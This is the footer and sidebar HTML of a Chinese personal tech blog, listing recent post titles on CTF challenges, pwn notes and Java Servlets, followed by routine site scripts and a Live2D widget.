<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
</div>

    <span><a href="/posts/e3418ca3.html" title="随机二次元图api相关">随机二次元图api相关</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/53e2b2e1.html" title="ctfshow-命令执行">ctfshow-命令执行</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
</div>

    <span><a href="/posts/d7e2e20f.html" title="pwn学习笔记（0）-事后补充">pwn学习笔记（0）-事后补充</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/4fb535d6.html" title="ctfshow-反序列化">ctfshow-反序列化</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/97a7dff3.html" title="ctfshow-信息搜集">ctfshow-信息搜集</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Java/" title="分类于 Java从入门到入狱">Java从入门到入狱</a>
</div>

    <span><a href="/posts/3d5d6561.html" title="三、Servlet基础">三、Servlet基础</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
</div>

    <span><a href="/posts/a698ff8.html" title="pwn学习笔记（5）--格式化字符串漏洞（未完全完成）">pwn学习笔记（5）--格式化字符串漏洞（未完全完成）</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/ff5b88d5.html" title="python原型链污染">python原型链污染</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/2d792864.html" title="Python栈帧逃逸">Python栈帧逃逸</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
</div>

    <span><a href="/posts/215f7d8b.html" title="【2025】HECTF">【2025】HECTF</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
  </div>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: 'posts/215f7d8b.html',
    favicon: {
      show: "（●´3｀●）やれやれだぜ",
      hide: "(´Д｀)大変だ！"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
</html>
